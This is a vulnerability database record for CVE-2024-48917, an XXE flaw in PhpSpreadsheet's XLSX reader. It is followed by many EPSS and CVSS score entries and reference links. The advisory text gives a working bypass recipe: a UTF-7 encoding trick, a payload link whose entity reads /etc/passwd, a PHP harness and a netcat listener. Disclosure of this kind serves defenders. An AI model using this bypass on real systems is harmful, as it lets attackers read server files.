vulnerability_id: VCID-xpbd-1qrf-hkbf
aliases:
  - CVE-2024-48917
  - GHSA-7cc9-j4mv-vcjp
summary: "XXE in PHPSpreadsheet's XLSX reader\n### Summary\n\nThe [XmlScanner class](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php)\
  \ has a [scan](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72)\
  \ method which should prevent XXE attacks.\n\nHowever, we found another bypass than the previously\
  \ reported `CVE-2024-47873`, the regexes from the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51)\
  \ method, which is used for determining the current encoding can be bypassed by using a payload\
  \ in the encoding UTF-7, and adding at end of the file a comment with the value `encoding=\"\
  UTF-8\"` with `\"`, which is matched by the first regex, so that `encoding='UTF-7'` with single\
  \ quotes `'` in the XML header is not matched by the second regex: \n\n```\n $patterns = [\n\
  \            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\\
  s*'([^']*?)'/\",\n        ];\n``` \n\nA payload for the `workbook.xml` file can for example\
  \ be created with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K).\n\
  If you open an Excel file containing the payload from the link above stored in the `workbook.xml`\
  \ file with PhpSpreadsheet, you will receive an HTTP request on `127.0.0.1:12345`. You can\
  \ test that an HTTP request is created by running the `nc -nlvp 12345` command before opening\
  \ the file containing the payload with PhpSpreadsheet.\n\nTo create the payload you need:\n\
  1. Create a file containing `<?xml version = \"1.0\" encoding='UTF-7'` in an XML file\n2.\
  \ Use the link attached above to create your XXE payload and add it to the XML file. \n3.\
  \ Add `+ADw-+ACE---encoding=\"UTF-8\"--+AD4-` to the end of the XML file, which is matched\
  \ by the first regex. \n\n### PoC\n\n[payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx)\n\
  \n- Create a new folder.\n- Run the `composer require phpoffice/phpspreadsheet` command in\
  \ the new folder.\n- Create an `index.php` file in that folder with the following content:\n\
  ```PHP\n<?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\n\
  use PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType\
  \ = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined\
  \ in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n\
  /**  Advise the Reader that we only want to load cell data  **/\n$reader->setReadDataOnly(true);\n\
  \n$worksheetData = $reader->listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData\
  \ as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"<h4>$sheetName</h4>\"\
  ;\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader->setLoadSheetsOnly($sheetName);\n\
  $spreadsheet = $reader->load($inputFileName);\n\n$worksheet = $spreadsheet->getActiveSheet();\n\
  print_r($worksheet->toArray());\n\n}\n```\n- Run the following command: `php -S 127.0.0.1:8080`\n\
  - Add the [payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx)\
  \ file in the folder and open <https://127.0.0.1:8080> in a browser. You will see an HTTP\
  \ request on netcat <http://127.0.0.1:12345/ext.dtd>.\n\n### Impact\n\nAn attacker can bypass\
  \ the sanitizer and achieve an [XXE attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)."
severities:
  - score: '0.00019'
    scoring_system: epss
    scoring_elements: '0.03409'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.03993'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.04004'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.03992'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.03991'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.03977'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.03976'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.04039'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.04057'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.04023'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.04032'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00021'
    scoring_system: epss
    scoring_elements: '0.0405'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00027'
    scoring_system: epss
    scoring_elements: '0.05652'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00032'
    scoring_system: epss
    scoring_elements: '0.07741'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20097'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19565'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19601'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19675'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19666'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19683'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19713'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19750'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20031'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20101'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20198'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20129'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20121'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20420'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26487'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26387'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26339'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26495'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26513'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26524'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26529'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.2646'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26465'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26501'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26536'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26537'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26502'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26494'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.0011'
    scoring_system: epss
    scoring_elements: '0.26473'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: '0.00214'
    scoring_system: epss
    scoring_elements: '0.2981'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-7cc9-j4mv-vcjp
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T20:14:30Z/
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T20:14:30Z/
    published_at: None
    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-48917
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-48917
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T20:14:30Z/
    published_at: None
    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
weaknesses:
  - CWE-937
  - CWE-1035
  - CWE-611
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-48917
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-48917
    reference_type:
    reference_id:
  - url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-7cc9-j4mv-vcjp
    reference_type:
    reference_id: GHSA-7cc9-j4mv-vcjp
